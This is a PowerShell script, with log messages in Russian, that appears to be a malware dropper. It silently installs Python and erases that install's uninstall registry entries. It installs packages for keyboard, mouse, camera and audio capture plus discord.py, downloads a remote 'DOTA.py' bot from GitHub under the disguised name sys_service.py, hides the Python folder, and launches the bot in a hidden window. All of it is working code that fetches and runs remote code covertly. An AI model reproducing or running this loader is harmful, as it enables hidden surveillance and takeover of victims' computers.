$ErrorActionPreference = "Continue"
$ProgressPreference = 'SilentlyContinue'

$logFile = "$env:TEMP\deploy.log"
function Log($msg) {
    $line = "[$(Get-Date -Format 'HH:mm:ss')] $msg"
    Add-Content -Path $logFile -Value $line -Encoding UTF8
}

Log "=== [c4] Запуск deploy ==="

$pyDir = "$env:LOCALAPPDATA\Programs\Python\Python311"
$pyPath = "$pyDir\python.exe"
$wc = New-Object Net.WebClient
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# 1. Скачивание и установка Python 3.11
if (-not (Test-Path $pyPath)) {
    Log "Скачивание установщика Python 3.11..."
    $installer = "$env:TEMP\py_setup.exe"
    $wc.DownloadFile("https://www.python.org/ftp/python/3.11.9/python-3.11.9-amd64.exe", $installer)
    
    Log "Тихая установка Python 3.11..."
    Start-Process -FilePath $installer -ArgumentList "/quiet InstallAllUsers=0 PrependPath=1 Include_test=0 Include_launcher=0 AssociateFiles=0 Shortcuts=0" -Wait
    Remove-Item $installer -Force -ErrorAction SilentlyContinue

    $uninstallBase = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall"
    Get-ChildItem $uninstallBase -ErrorAction SilentlyContinue | Where-Object { $_.GetValue("DisplayName") -like "*Python*" } | Remove-Item -Recurse -Force -ErrorAction SilentlyContinue

    $env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User")
}

if (-not (Test-Path $pyPath)) {
    Log "ОШИБКА: Python не найден по пути $pyPath"
    exit 1
}
Log "Python доступен: $pyPath"

# 2. Установка pip и пакетов
Log "Обновление pip..."
& $pyPath -m pip install --upgrade pip -q

Log "Установка зависимостей (может занять 2-4 мин)..."
$deps = "discord.py keyboard mouse psutil pyttsx3 requests pywin32 pycryptodome Pillow comtypes pycaw opencv-python pyaudio"
& $pyPath -m pip install $deps.Split(" ") -q 2>&1 | Out-File -Append -FilePath $logFile -Encoding UTF8
Log "Зависимости установлены."

# 3. Скачивание бота
Log "Скачивание DOTA.py..."
$repoUrl = "https://raw.githubusercontent.com/ht-at/DOTAMOD/refs/heads/main/DOTA.py"
$botPath = "$env:TEMP\sys_service.py"
$wc.DownloadFile($repoUrl, $botPath)
Log "DOTA.py сохранен в $botPath"

# 4. Запуск процесса
$pyw = Join-Path $pyDir "pythonw.exe"
attrib +h +s "$env:LOCALAPPDATA\Programs\Python" 2>$null | Out-Null
Log "Запуск процесса через $pyw..."
$proc = Start-Process -FilePath $pyw -ArgumentList "-W ignore `"$botPath`"" -WindowStyle Hidden -PassThru
Log "Бот запущен. PID: $($proc.Id)"
Log "=== Deploy завершен успешно ==="
